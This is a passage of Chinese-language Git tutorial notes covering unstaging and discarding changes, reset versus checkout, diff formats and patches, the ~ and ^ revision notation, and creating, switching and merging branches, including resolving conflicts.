那么之前的提交信息不必修改，你只需作出更改，暂存它们，然后通过以下命令避免不必要的编辑器环节即可：\n```\n$ git commit --amend --no-edit\n```\n\n### 取消暂存的文件\n接下来的两个小节演示如何操作暂存区和工作目录中已修改的文件。 这些命令在修改文件状态的同时，也会提示如何撤消操作。 例如，你已经修改了两个文件并且想要将它们作为两次独立的修改提交， 但是却意外地输入 `git add *`暂存了它们两个。如何只取消暂存两个中的一个呢？`git status`命令提示了你：\n```shell\n$ git add *\n$ git status\nOn branch master\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    renamed:    README.md -> README\n    modified:   CONTRIBUTING.md\n```\n在`“Changes to be committed”`文字正下方，提示使用`git reset HEAD <file>...`来取消暂存。 所以，我们可以这样来取消暂存 CONTRIBUTING.md 文件：\n```shell\n$ git reset HEAD CONTRIBUTING.md\nUnstaged changes after reset:\nM\tCONTRIBUTING.md\n$ git status\nOn branch master\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    renamed:    README.md -> README\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n这个命令有点儿奇怪，但是起作用了。 CONTRIBUTING.md 文件已经是修改未暂存的状态了。\n\n### 撤消对文件的修改\n如果你并不想保留对 CONTRIBUTING.md 文件的修改怎么办？ 你该如何方便地撤消修改——将它还原成上次提交时的样子（或者刚克隆完的样子，或者刚把它放入工作目录时的样子）？ 幸运的是，`git status`也告诉了你应该如何做。 在最后一个例子中，未暂存区域是这样：\n```shell\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n它非常清楚地告诉了你如何撤消之前所做的修改。 让我们来按照提示执行：\n```shell\n$ git checkout -- CONTRIBUTING.md\n$ git status\nOn branch master\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    renamed:    README.md -> README\n```\n可以看到那些修改已经被撤消了。\n\n> Important\n请务必记得`git checkout -- <file>`是一个危险的命令。 你对那个文件在本地的任何修改都会消失——Git 会用最近提交的版本覆盖掉它。 除非你确实清楚不想要对那个文件的本地修改了，否则请不要使用这个命令。\n\n如果你仍然想保留对那个文件做出的修改，但是现在仍然需要撤消，我们将会在 Git 分支 介绍保存进度与分支，这通常是更好的做法。\n\n记住，在 Git 中任何 已提交 的东西几乎总是可以恢复的。 甚至那些被删除的分支中的提交或使用 `--amend`选项覆盖的提交也可以恢复 （阅读 数据恢复 了解数据恢复）。 然而，任何你未提交的东西丢失后很可能再也找不到了。\n\n### reset\n`git reset --soft 提交对象A`: 设置HEAD与HEAD指向的分支的指向为`提交对象A`, 而不改变索引区的指向，即不修改.git/index文件内容, 也不改变本地目录\n`git reset 提交对象A`: 设置HEAD与HEAD指向的分支的指向为`提交对象A`, 同时根据`提交对象A`指向的内容来改变索引区的指向，即修改.git/index文件内容, 但不改变本地目录\n`git reset --herd 提交对象A`: 设置HEAD与HEAD指向的分支的指向为`提交对象A`, 同时根据`提交对象A`指向的内容来改变索引区的指向以及本地目录\n\n### checkout\n运行`git checkout [branch]`与运行`git reset --hard [branch]`非常相似，不过有两点重要的区别。\n\n首先不同于`reset --hard`，`checkout`对工作目录是安全的，它会通过检查来确保不会将已更改的文件弄丢。 其实它还更聪明一些。它会在工作目录中先试着简单合并一下，这样所有 还未修改过的 文件都会被更新。 而`reset --hard`则会不做检查就全面地替换所有东西。\n\n第二个重要的区别是`checkout`如何更新`HEAD`。 reset 会移动 HEAD 分支的指向，而 checkout 只会移动 HEAD 自身来指向另一个分支。\n例如，假设我们有 master 和 develop 分支，它们分别指向不同的提交；我们现在在 develop 上（所以 HEAD 指向它）。 如果我们运行 git reset master，那么 develop 自身现在会和 master 指向同一个提交。 而如果我们运行 git checkout master 的话，develop 不会移动，HEAD 自身会移动。 现在 HEAD 将会指向 master。\n所以，虽然在这两种情况下我们都移动 HEAD 使其指向了提交 A，但 做法 是非常不同的。 reset 会移动 HEAD 分支的指向，而 checkout 则移动 HEAD 自身。\n\n### reflog\n`git reflog`与`git log`的区别\n`git log`: 如果不适用--all参数, 只会展示当前分支指向的提交对象以及其所有祖先提交对象\n`git reflog`会展示所有的提交对象\n\n\n## Git Diff\n### \"合并格式\"的diff\n如果两个文件相似度很高，那么上下文格式的diff，将显示大量重复的内容，很浪费空间。1990年，GNU diff率先推出了\"合并格式\"的diff，将f1和f2的上下文合并在一起显示。\n它的使用方法是加入u参数（代表unified）。\n```shell\n$ diff -u f1 f2\n```\n显示结果如下：\n```shell\n　　--- f1 2012-08-29 16:45:41.000000000 +0800\n　　+++ f2 2012-08-29 16:45:51.000000000 +0800\n　　@@ -1,7 +1,7 @@\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n它的第一部分，也是文件的基本信息。\n```shell\n　　--- f1 2012-08-29 16:45:41.000000000 +0800\n　　+++ f2 2012-08-29 16:45:51.000000000 +0800\n```\n\"---\"表示变动前的文件，\"+++\"表示变动后的文件。\n第二部分，变动的位置用两个@作为起首和结束。\n```shell\n　　@@ -1,7 +1,7 @@\n```\n前面的\"-1,7\"分成三个部分：减号表示第一个文件（即f1），\"1\"表示第1行，\"7\"表示连续7行。合在一起，就表示下面是第一个文件从第1行开始的连续7行。同样的，\"+1,7\"表示变动后，成为第二个文件从第1行开始的连续7行。\n\n第三部分是变动的具体内容。\n```\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n除了有变动的那些行以外，也是上下文各显示3行。它将两个文件的上下文，合并显示在一起，所以叫做\"合并格式\"。每一行最前面的标志位，空表示无变动，减号表示第一个文件删除的行，加号表示第二个文件新增的行。\n\n### git格式的diff\n版本管理系统git，使用的是合并格式diff的变体。\n```shell\n　　$ git diff\n```\n显示结果如下：\n```shell\n　　diff --git a/f1 b/f1\n　　index 6f8a38c..449b072 100644\n　　--- a/f1\n　　+++ b/f1\n　　@@ -1,7 +1,7 @@\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n第一行表示结果为git格式的diff。\n```shell\n　　diff --git a/f1 b/f1\n```\n进行比较的是，a版本的f1（即变动前）和b版本的f1（即变动后）。\n\n第二行表示两个版本的git哈希值（index区域的6f8a38c对象，与工作目录区域的449b072对象进行比较），最后的六位数字是对象的模式（普通文件，644权限）。\n```\n　　index 6f8a38c..449b072 100644\n```\n第三行表示进行比较的两个文件。\n```\n　　--- a/f1\n　　+++ b/f1\n```\n\"---\"表示变动前的版本，\"+++\"表示变动后的版本。\n\n后面的行都与官方的合并格式diff相同。\n```\n　　@@ -1,7 +1,7 @@\n　　 a\n　　 a\n　　 a\n　　-a\n　　+b\n　　 a\n　　 a\n　　 a\n```\n### git diff 命令常用技巧\n#### git diff\n当我们直接修改了工作区中的文件之后，在添加到暂存区之前，想要看看修改了那些内容，保证修改正确性。这时候运行 git diff 即可，将会显示暂存区与工作区文件的差异。如下图就是一个示例：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105111.png)\n\n可以看到工作区的 test.txt 文件比暂存区 test.txt 文件新增了一行内容。\n\n#### git diff commit\n比较「工作区」与「给定提交 ID」的差异。\n\n有时候你需要将工作区的改动和历史中某个提交点的内容进行对比，这个命令就有用了。例如，我要将目前工作区的内容和当前分支的最新一次的提交进行比较，运行 git diff 3f0c1b 或者 git diff HEAD 即可：\n\n#### git diff --cached commit\n比较「暂存区」与「给定提交 ID」的差异。\n\n因为已经将修改内容添加到暂存区了，这时候直接运行 git diff 就看不到差异了。因为我们手速快，已经将工作区修改的文件通过 git add 命令添加到暂存区了，这时候，又想要知道暂存区的变更和给定提交点的差异。只需要加上 --cached 选项即可。\n\n例如，我现在将上面的修改已经添加到了暂存区，运行 git diff --cached HEAD 即可将暂存区内容与最新一次提交进行比较\n\n> 如果省略 commit，那么，就是默认指 HEAD。\n\n#### git diff commit1 commit2\n比较指定的两次提交 「commit1」与 「commit2」的差异。\n\n#### 补丁 patch\n补丁名是自定义的，通常带有 patch 命名，这样命名比较通俗易懂。\n\n前面介绍的 4 中比较差异的场景，我们可以通过比较差异的命令加上`> patch`这样的方式导出补丁文件。这里的 patch 就是自定义的补丁名。\n我们来进行一个示例。使用`git diff HEAD~ HEAD`> patch 导出上一次提交和这一次提交差异的补丁。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105123.png)\n\n运行上述命令之后，会生成一个叫 patch 补丁文件。\n\n怎么用这个补丁呢？示例：\n```shell\n# 切换至倒数第 2 个提交\ngit reset --hard HEAD~\n# 应用一下补丁\ngit apply patch\n```\n这时候刚刚差异的内容就会在相应的文件夹进行修改了，但是并不会生成提交。\n\n>补丁文件可以发给其他人，只需执行 git apply patch 就可以实现打补丁的效果喽。\n\n在打补丁之前，可以先检验补丁能否应用，执行 git apply --check patch 即可。如果没有任何输出，那么表示可以顺利打补丁。\n\n#### 限制路径\n如果只要显示 src 文件夹下的差异，指定文件夹名即可， `git diff --stat HEAD~ HEAD src`, 比较HEAD~与HEAD下的src文件夹的差异\n如果只要显示 test.txt 文件的差异，指定文件即可， `git diff HEAD~ HEAD src/test.txt`，比较HEAD~与HEAD下的src/test.txt文件的差异\n\n### git diff中的a/和b/前缀含义\n如 git diff man中所述页，a/et b/代表区分来源和目的地的前缀.\n实际上，您可以选择:\n```\n--no-prefix\n```\n不显示任何源或目标前缀.\n```\n--src-prefix=<prefix>\n```\n显示给定的源前缀，而不是\"a/\".\n```\n--dst-prefix=<prefix>\n```\n显示给定的目标前缀，而不是\"b/\"\n\n## Git中的~和^\n简言之，单独使用时，~表示纵深位置，^表示横向位置。\n为什么加单独使用限定呢，多个符号叠加的语义是增加纵深。如`HEAD^^`==`HEAD~~`==`HEAD~2`\n\n### 为何需要 ~ 和 ^\n不知道大家有没体会到，我们经常需要根据一个提交去查找它的祖先提交，如查找 HEAD 的第三个祖先提交。\n要找到对应的提交，我们可以直接通过 git log，然后手动选中第三个提交。\n```\n$ git log --graph --oneline\n* a19bf31 D\n* 85ce81b C\n* 73d1f3b B\n* 078e0e6 A\n...\n```\n然后我们选中 078e0e6 (A) 这个提交，接着进行余下的操作。\n这种方式虽然可以实现我们的需求，如果我们想要 HEAD 的第 10 个祖先提交呢？那是要把 log 打印出来，然后一条一条慢慢找吗？这样的话就太低效了。\n我们需要有一种方式，根据一个提交快速找到它的祖先提交，因此，我们就需要 ~ 和 ^ 这两个符号拉。\n\n### ~ 的作用\n如果我们想要 HEAD 的第 10 个祖先提交，我们直接用 HEAD~10 就可以了。`<rev>~<n>`用来表示一个提交的第 n 个祖先提交，如果不指定 n，那么默认为 1。另外，HEAD~~~ 和 HEAD~3 是等价的。\n``` \n$ git rev-parse HEAD\na19bf31 (D)\n$ git rev-parse HEAD~0\na19bf31 (D)\n$ git rev-parse HEAD~\n85ce81b (C)\n$ git rev-parse HEAD~1\n85ce81b (C)\n$ git rev-parse HEAD~~\n73d1f3b (B)\n$ git rev-parse HEAD~3\n078e0e6 (A) \n```\n\n### ^ 的作用\n先看看下面这幅图：\n``` \n$ git log --graph --oneline\n* f44239d D\n* 7a3fb3d C\n|\\\n| * 07b920c B\n|/\n* 71bd2cf A\n...\n```\n我们知道，很多情况下一个提交并不是只有一个父提交。就如上图表示那样，7a3fb3d (C) 就有两个父提交：\n```\n07b920c (B)\n71bd2cf (A)。\n```\n这时候，我们是不能通过 ~ 去找到 07b920c (B) 这个提交的。如果一个提交有多个父提交，那么 ~ 只会找第一个父提交, **在`git log --oneline --graph`命令输出中父提交的产生先后顺序是从左至右的**,那么我们应该怎么找到 07b920c (B) 呢？答案是：HEAD~^2\n`<rev>^<n>` 用来表示一个提交的第 n 个父提交，如果不指定 n，那么默认为 1。和 ~ 不同的是，HEAD^^^ 并不等价于 HEAD^3，而是等价与 HEAD^1^1^1。\n``` \n$ git rev-parse HEAD~\n7a3fb3d (C)\n$ git rev-parse HEAD~^\n71bd2cf (A)\n$ git rev-parse HEAD~^0\n7a3fb3d (C)\n$ git rev-parse HEAD~^2\n07b920c (B)\n$ git rev-parse HEAD~^3\nfatal: ambiguous argument 'HEAD~^3': unknown revision or path not in the working tree.\n$ git rev-parse HEAD^2\nfatal: ambiguous argument 'HEAD^2': unknown revision or path not in the working tree.\n```\n\n### ~ 与 ^ 的关系\n我们知道，~ 获取第一个祖先提交，^ 可以获取第一个父提交。\n其实第一个祖先提交就是第一个父提交，反之亦然。\n因此，当 n 为 1 时，~ 和 ^ 其实是等价的。\n譬如：HEAD~~~ 和 HEAD^^^ 是等价的。\n\n# Git分支\n## 分支简介\n为了真正理解 Git 处理分支的方式，我们需要回顾一下 Git 是如何保存数据的。\n\n或许你还记得 起步 的内容， Git 保存的不是文件的变化或者差异，而是一系列不同时刻的 快照 。\n\n在进行提交操作时，Git 会保存一个提交对象（commit object）。 知道了 Git 保存数据的方式，我们可以很自然的想到——该提交对象会包含一个指向暂存内容快照的指针。 但不仅仅是这样，该提交对象还包含了作者的姓名和邮箱、提交时输入的信息以及指向它的父对象的指针。 首次提交产生的提交对象没有父对象，普通提交操作产生的提交对象有一个父对象， 而由多个分支合并产生的提交对象有多个父对象，\n\n为了更加形象地说明，我们假设现在有一个工作目录，里面包含了三个将要被暂存和提交的文件。 暂存操作会为每一个文件计算校验和（使用我们在 起步 中提到的 SHA-1 哈希算法），然后会把当前版本的文件快照保存到 Git 仓库中 （Git 使用 blob 对象来保存它们），最终将校验和加入到暂存区域等待提交：\n```shell\n$ git add README test.rb LICENSE\n$ git commit -m 'The initial commit of my project'\n```\n当使用`git commit`进行提交操作时，Git 会先计算每一个子目录（本例中只有项目根目录）的校验和， 然后在 Git 仓库中这些校验和保存为树对象。随后，Git 便会创建一个提交对象， 它除了包含上面提到的那些信息外，还包含指向这个树对象（项目根目录）的指针。 如此一来，Git 就可以在需要的时候重现此次保存的快照。\n\n现在，Git 仓库中有五个对象：三个`blob`对象（保存着文件快照）、一个`树`对象 （记录着目录结构和 blob 对象索引）以及一个`提交`对象（包含着指向前述树对象的指针和所有提交信息）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105138.png)\n\n做些修改后再次提交，那么这次产生的提交对象会包含一个指向上次提交对象（父对象）的指针。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105150.png)\n\n<font color=\"red\">Git 的分支，其实本质上仅仅是指向提交对象的可变指针。</font> Git 的默认分支名字是 master。 在多次提交操作之后，你其实已经有一个指向最后那个提交对象的 master 分支。 master 分支会在每次提交时自动向前移动。\n\n>Note\nGit 的 master 分支并不是一个特殊分支。 它就跟其它分支完全没有区别。 之所以几乎每一个仓库都有 master 分支，是因为 git init 命令默认创建它，并且大多数人都懒得去改动它。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105200.png)\n\n### 分支创建\nGit 是怎么创建新分支的呢？ 很简单，它只是为你创建了一个可以移动的新的指针。 比如，创建一个 testing 分支， 你需要使用`git branch`命令：\n```shell\n$ git branch testing\n```\n这会在当前所在的提交对象上创建一个指针。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105210.png)\n\n那么，Git 又是怎么知道当前在哪一个分支上呢？ 也很简单，它有一个名为`HEAD`的特殊指针。 请注意它和许多其它版本控制系统（如 Subversion 或 CVS）里的 HEAD 概念完全不同。 在 Git 中，它是一个指针，指向当前所在的本地分支（译注：将`HEAD`想象为当前分支的别名）。 在本例中，你仍然在`master`分支上。 因为`git branch`命令仅仅 创建 一个新分支，并不会自动切换到新分支中去。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105222.png)\n\n你可以简单地使用`git log`命令查看各个分支当前所指的对象。 提供这一功能的参数是`--decorate`。\n```shell\n$ git log --oneline --decorate\nf30ab (HEAD -> master, testing) add feature #32 - ability to add new formats to the central interface\n34ac2 Fixed bug #1328 - stack overflow under certain conditions\n98ca9 The initial commit of my project\n```\n正如你所见，当前`master`和`testing`分支均指向校验和以`f30ab`开头的提交对象。\n\n### 分支切换\n要切换到一个已存在的分支，你需要使用`git checkout`命令。 我们现在切换到新创建的`testing`分支去：\n```shell\n$ git checkout testing\n```\n这样 HEAD 就指向 testing 分支了。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105233.png)\n\n那么，这样的实现方式会给我们带来什么好处呢？ 现在不妨再提交一次：\n```shell\n$ vim test.rb\n$ git commit -a -m 'made a change'\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105243.png)\n\n如图所示，你的`testing`分支向前移动了，但是`master`分支却没有，它仍然指向运行`git checkout`时所指的对象。 这就有意思了，现在我们切换回`master`分支看看：\n```shell\n$ git checkout master\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105254.png)\n\n这条命令做了两件事。 一是使`HEAD`指回`master`分支，二是将工作目录恢复成`master`分支所指向的快照内容。 也就是说，你现在做修改的话，项目将始于一个较旧的版本。 本质上来讲，这就是忽略`testing`分支所做的修改，以便于向另一个方向进行开发。\n\n> Note\n<font color=\"red\">分支切换会改变你工作目录中的文件，也会改变暂存区中的内容</font>\n在切换分支时，一定要注意你工作目录里的文件会被改变。 如果是切换到一个较旧的分支，你的工作目录会恢复到该分支最后一次提交时的样子。 如果 Git 不能干净利落地完成这个任务，它将禁止切换分支。但是当一个文件<font color=\"red\">第一次</font>创建并未追踪，或者<font color=\"red\">第一次</font>将其放入暂存区中但未提交时，分支是可以切换成功的，但是会导致这个文件依然存在其他分支中的工作目录中，从而污染其他分支\n所以切换分支前，当前分支一定是干净的（以提交状态）， 使用`git status`查看，\n```shell\n$ git status\nOn branch test\nnothing to commit, working tree clean\n```\n上述输出说明当前分支是干净的\n\n\n我们不妨再稍微做些修改并提交：\n```shell\n$ vim test.rb\n$ git commit -a -m 'made other changes'\n```\n现在，这个项目的提交历史已经产生了分叉（参见 项目分叉历史）。 因为刚才你创建了一个新分支，并切换过去进行了一些工作，随后又切换回`master`分支进行了另外一些工作。 上述两次改动针对的是不同分支：你可以在不同分支间不断地来回切换和工作，并在时机成熟时将它们合并起来。 而所有这些工作，你需要的命令只有`branch`、`checkout`和`commit`。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104740.png)\n\n你可以简单地使用 git log 命令查看分叉历史。 运行`git log --oneline --decorate --graph --all`，它会输出你的提交历史、各个分支的指向以及项目的分支分叉情况。\n```shell\n$ git log --oneline --decorate --graph --all\n* c2b9e (HEAD, master) made other changes\n| * 87ab2 (testing) made a change\n|/\n* f30ab add feature #32 - ability to add new formats to the\n* 34ac2 fixed bug #1328 - stack overflow under certain conditions\n* 98ca9 initial commit of my project\n```\n由于 Git 的分支实质上仅是包含所指对象校验和（长度为 40 的 SHA-1 值字符串）的文件，所以它的创建和销毁都异常高效。 创建一个新分支就相当于往一个文件中写入 41 个字节（40 个字符和 1 个换行符），如此的简单能不快吗？\n\n这与过去大多数版本控制系统形成了鲜明的对比，它们在创建分支时，将所有的项目文件都复制一遍，并保存到一个特定的目录。 完成这样繁琐的过程通常需要好几秒钟，有时甚至需要好几分钟。所需时间的长短，完全取决于项目的规模。 而在 Git 中，任何规模的项目都能在瞬间创建新分支。 同时，由于每次提交都会记录父对象，所以寻找恰当的合并基础（译注：即共同祖先）也是同样的简单和高效。 这些高效的特性使得 Git 鼓励开发人员频繁地创建和使用分支。\n\n接下来，让我们看看你为什么应该这样做。\n\n>Note\n创建新分支的同时切换过去\n通常我们会在创建一个新分支后立即切换过去，这可以用`git checkout -b <newbranchname>`一条命令搞定。\n\n\n## 分支的新建与合并\n让我们来看一个简单的分支新建与分支合并的例子，实际工作中你可能会用到类似的工作流。 你将经历如下步骤：\n- 开发某个网站。\n- 为实现某个新的用户需求，创建一个分支。\n- 在这个分支上开展工作。\n\n正在此时，你突然接到一个电话说有个很严重的问题需要紧急修补。 你将按照如下方式来处理：\n- 切换到你的线上分支（production branch）。\n- 为这个紧急任务新建一个分支，并在其中修复它。\n- 在测试通过之后，切换回线上分支，然后合并这个修补分支，最后将改动推送到线上分支。\n- 切换回你最初工作的分支上，继续工作。\n\n### 新建分支\n首先，我们假设你正在你的项目上工作，并且在`master`分支上已经有了一些提交。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104058.png)\n\n现在，你已经决定要解决你的公司使用的问题追踪系统中的 #53 问题。 想要新建一个分支并同时切换到那个分支上，你可以运行一个带有`-b`参数的`git checkout`命令：\n```shell\n$ git checkout -b iss53\nSwitched to a new branch \"iss53\"\n```\n它是下面两条命令的简写：\n```shell\n$ git branch iss53\n$ git checkout iss53\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104109.png)\n\n你继续在 #53 问题上工作，并且做了一些提交。 在此过程中，`iss53`分支在不断的向前推进，因为你已经检出到该分支 （也就是说，你的`HEAD`指针指向了`iss53`分支）\n```shell\n$ vim index.html\n$ git commit -a -m 'added a new footer [issue 53]'\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104118.png)\n\n现在你接到那个电话，有个紧急问题等待你来解决。 有了 Git 的帮助，你不必把这个紧急问题和`iss53`的修改混在一起， 你也不需要花大力气来还原关于 53# 问题的修改，然后再添加关于这个紧急问题的修改，最后将这个修改提交到线上分支。 你所要做的仅仅是切换回`master`分支。\n\n但是，在你这么做之前，要留意你的工作目录和暂存区里那些还没有被提交的修改， 它可能会和你即将检出的分支产生冲突从而阻止 Git 切换到该分支。 最好的方法是，在你切换分支之前，保持好一个干净的状态。 有一些方法可以绕过这个问题（即，暂存（stashing） 和 修补提交（commit amending））， 我们会在 贮藏与清理 中看到关于这两个命令的介绍。 现在，我们假设你已经把你的修改全部提交了，这时你可以切换回 master 分支了：\n```shell\n$ git checkout master\nSwitched to branch 'master'\n```\n这个时候，你的工作目录和你在开始 #53 问题之前一模一样，现在你可以专心修复紧急问题了。 请牢记：当你切换分支的时候，Git 会重置你的工作目录，使其看起来像回到了你在那个分支上最后一次提交的样子。 Git 会自动添加、删除、修改文件以确保此时你的工作目录和这个分支最后一次提交时的样子一模一样。\n\n接下来，你要修复这个紧急问题。 我们来建立一个`hotfix`分支，在该分支上工作直到问题解决：\n```shell\n$ git checkout -b hotfix\nSwitched to a new branch 'hotfix'\n$ vim index.html\n$ git commit -a -m 'fixed the broken email address'\n[hotfix 1fb7853] fixed the broken email address\n 1 file changed, 2 insertions(+)\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104128.png)\n\n你可以运行你的测试，确保你的修改是正确的，然后将 hotfix 分支合并回你的 master 分支来部署到线上。 你可以使用 git merge 命令来达到上述目的：\n```shell\n$ git checkout master\n$ git merge hotfix\nUpdating f42c576..3a0874c\nFast-forward\n index.html | 2 ++\n 1 file changed, 2 insertions(+)\n```\n在合并的时候，你应该注意到了`“快进（fast-forward）”`这个词。 由于你想要合并的分支`hotfix`所指向的提交 C4 是你所在的提交 C2 的直接后继， 因此 Git 会直接将指针向前移动。换句话说，当你试图合并两个分支时， 如果顺着一个分支走下去能够到达另一个分支，那么 Git 在合并两者的时候， 只会简单的将指针向前推进（指针右移），因为这种情况下的合并操作没有需要解决的分歧——这就叫做 `“快进（fast-forward）”`。\n\n现在，最新的修改已经在`master`分支所指向的提交快照中，你可以着手发布该修复了。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104154.png)\n\n关于这个紧急问题的解决方案发布之后，你准备回到被打断之前时的工作中。 然而，你应该先删除`hotfix`分支，因为你已经不再需要它了 ——`master`分支已经指向了同一个位置。 你可以使用带`-d`选项的`git branch`命令来删除分支：\n```shell\n$ git branch -d hotfix\nDeleted branch hotfix (3a0874c).\n```\n现在你可以切换回你正在工作的分支继续你的工作，也就是针对 #53 问题的那个分支（iss53 分支）。\n```shell\n$ git checkout iss53\nSwitched to branch \"iss53\"\n$ vim index.html\n$ git commit -a -m 'finished the new footer [issue 53]'\n[iss53 ad82d7a] finished the new footer [issue 53]\n1 file changed, 1 insertion(+)\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104204.png)\n\n你在`hotfix`分支上所做的工作并没有包含到`iss53`分支中。 如果你需要拉取`hotfix`所做的修改，你可以使用`git merge master`命令将`master`分支合并入`iss53`分支，或者你也可以等到`iss53`分支完成其使命，再将其合并回`master`分支。\n\n### 分支的合并\n假设你已经修正了 #53 问题，并且打算将你的工作合并入`master`分支。 为此，你需要合并`iss53`分支到`master`分支，这和之前你合并`hotfix`分支所做的工作差不多。 你只需要检出到你想合并入的分支，然后运行`git merge`命令：\n```shell\n$ git checkout master\nSwitched to branch 'master'\n$ git merge iss53\nMerge made by the 'recursive' strategy.\nindex.html |    1 +\n1 file changed, 1 insertion(+)\n```\n\n这和你之前合并`hotfix`分支的时候看起来有一点不一样。 在这种情况下，你的开发历史从一个更早的地方开始分叉开来（diverged）。** 因为，`master`分支所在提交并不是`iss53`分支所在提交的直接祖先，Git 不得不做一些额外的工作。 出现这种情况的时候，Git 会使用两个分支的末端所指的快照（C4 和 C5）以及这两个分支的公共祖先（C2），做一个简单的三方合并**。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104214.png)\n\n和之前将分支指针向前推进所不同的是，Git 将此次三方合并的结果做了一个新的快照并且自动创建一个新的提交指向它。 这个被称作一次合并提交，它的特别之处在于他有不止一个父提交。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104223.png)\n\n既然你的修改已经合并进来了，就不再需要`iss53`分支了。 现在你可以在任务追踪系统中关闭此项任务，并删除这个分支。\n```shell\n$ git branch -d iss53\n```\n\n### 遇到冲突时的分支合并\n有时候合并操作不会如此顺利。 如果你在两个不同的分支中，对同一个文件的同一个部分进行了不同的修改，Git 就没法干净的合并它们。 如果你对 #53 问题的修改和有关`hotfix`分支的修改都涉及到同一个文件的同一处，在合并它们的时候就会产生合并冲突：\n```shell\n$ git merge iss53\nAuto-merging index.html\nCONFLICT (content): Merge conflict in index.html\nAutomatic merge failed; fix conflicts and then commit the result.\n```\n此时 Git 做了合并，但是没有自动地创建一个新的合并提交对象, 如下\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104233.png)\n\n此时我在test分支上，使用`git merge master`, 发生了冲突，此时的提交的历史如下, 可以发现提交历史没有发生改变：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104242.png)\n\n此时需要手动解决合并产生的冲突。解决完冲突且commit后，git会自动完成未完成merge操作，以下是解决完冲突且commit后的log\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104257.png)\n\n你可以在合并冲突后的任意时刻使用`git status`命令来查看那些因包含合并冲突而处于未合并（unmerged）状态的文件：\n```shell\n$ git status\nOn branch master\nYou have unmerged paths.\n  (fix conflicts and run \"git commit\")\n\nUnmerged paths:\n  (use \"git add <file>...\" to mark resolution)\n\n    both modified:      index.html\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n```\n任何因包含合并冲突而有待解决的文件，都会以未合并状态标识出来。 Git 会在有冲突的文件中加入标准的冲突解决标记，这样你可以打开这些包含冲突的文件然后手动解决冲突。 出现冲突的文件会包含一些特殊区段，看起来像下面这个样子：\n```shell\n<<<<<<< HEAD:index.html\n<div id=\"footer\">contact : email.support@github.com</div>\n=======\n<div id=\"footer\">\n please contact us at support@github.com\n</div>\n>>>>>>> iss53:index.html\n```\n\n这表示`HEAD`所指示的版本（也就是你的`master`分支所在的位置，因为你在运行`merge`命令的时候已经检出到了这个分支）在这个区段的上半部分（======= 的上半部分），而`iss53`分支所指示的版本在 ======= 的下半部分。 为了解决冲突，你必须选择使用由 ======= 分割的两部分中的一个，或者你也可以自行合并这些内容。 例如，你可以通过把这段内容换成下面的样子来解决冲突：\n```html\n<div id=\"footer\">\nplease contact us at email.support@github.com\n</div>\n```\n上述的冲突解决方案仅保留了其中一个分支的修改，并且`<<<<<<<`,`=======`, 和`>>>>>>>`这些行被完全删除了。 在你解决了所有文件里的冲突之后，对每个文件使用`git add`命令来将其标记为冲突已解决。 一旦暂存这些原本有冲突的文件，Git 就会将它们标记为冲突已解决。\n\n如果你想使用图形化工具来解决冲突，你可以运行`git mergetool`，该命令会为你启动一个合适的可视化合并工具，并带领你一步一步解决这些冲突：\n```shell\n$ git mergetool\n\nThis message is displayed because 'merge.tool' is not configured.\nSee 'git mergetool --tool-help' or 'git help config' for more details.\n'git mergetool' will now attempt to use one of the following tools:\nopendiff kdiff3 tkdiff xxdiff meld tortoisemerge gvimdiff diffuse diffmerge ecmerge p4merge araxis bc3 codecompare vimdiff emerge\nMerging:\nindex.html\n\nNormal merge conflict for 'index.html':\n  {local}: modified file\n  {remote}: modified file\nHit return to start merge resolution tool (opendiff):\n```\n如果你想使用除默认工具（在这里 Git 使用`opendiff`做为默认的合并工具，因为作者在 Mac 上运行该程序） 外的其他合并工具，你可以在 “下列工具中（one of the following tools）” 这句后面看到所有支持的合并工具。 然后输入你喜欢的工具名字就可以了。\n\n> Note\n如果你需要更加高级的工具来解决复杂的合并冲突，我们会在 高级合并 介绍更多关于分支合并的内容。\n\n等你退出合并工具之后，Git 会询问刚才的合并是否成功。 如果你回答是，Git 会暂存那些文件以表明冲突已解决： 你可以再次运行`git status`来确认所有的合并冲突都已被解决：\n```shell\n$ git status\nOn branch master\nAll conflicts fixed but you are still merging.\n  (use \"git commit\" to conclude merge)\n\nChanges to be committed:\n\n    modified:   index.html\n```\n如果你对结果感到满意，并且确定之前有冲突的的文件都已经暂存了，这时你可以输入`git commit`来完成合并提交。 默认情况下提交信息看起来像下面这个样子：\n```shell\nMerge branch 